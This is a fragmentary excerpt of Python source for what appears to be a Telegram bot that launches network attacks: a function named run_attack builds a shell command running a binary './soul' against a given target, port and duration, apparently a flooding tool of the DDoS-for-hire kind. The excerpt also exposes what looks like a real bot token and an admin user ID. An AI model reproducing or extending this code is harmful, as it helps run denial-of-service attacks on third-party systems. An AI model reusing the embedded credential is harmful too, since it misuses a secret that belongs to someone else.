...
bot_token = '7690334812:AAHjJaeK_QK31DH7nk-yHdlgHplSsPCnnqg'  # Replace with your bot token
...
ADMIN_ID = 1708821501  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./soul {target} {port} {attack_time} 900"
